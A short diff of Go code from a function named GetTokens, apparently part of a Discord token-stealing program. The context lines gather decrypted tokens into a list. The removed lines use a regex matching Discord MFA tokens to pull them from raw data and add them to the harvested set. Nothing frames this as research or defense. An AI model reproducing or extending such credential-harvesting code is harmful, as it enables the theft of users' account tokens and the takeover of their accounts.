@@ -105,14 +105,6 @@ func GetTokens() string {
 							tokens_current = append(tokens_current, decrypted)
 						}
 					}
-
-					mfa_token_mem, err := regexp.Compile(`mfa\.[\w-]{84}`)
-					if err == nil {
-						if string(mfa_token_mem.Find(data)) != "" {
-							t := string(mfa_token_mem.Find(data))
-							tokens_current = append(tokens_current, t)
-						}
-					}
 				}
 			}
 		} else {
